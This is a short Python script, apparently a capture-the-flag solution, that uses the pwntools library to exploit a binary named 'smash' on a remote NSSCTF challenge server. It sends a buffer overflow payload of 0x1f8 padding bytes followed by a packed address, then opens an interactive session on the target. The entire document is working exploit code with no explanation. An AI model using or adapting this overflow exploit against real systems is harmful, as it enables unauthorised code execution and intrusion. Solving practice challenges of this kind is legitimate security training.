from pwn import *

#io = process("./smash")
io = remote("node5.anna.nssctf.cn", 22831)

payload = b"a" * 0x1f8 + p64(0x404060)
io.sendline(payload)

io.interactive()
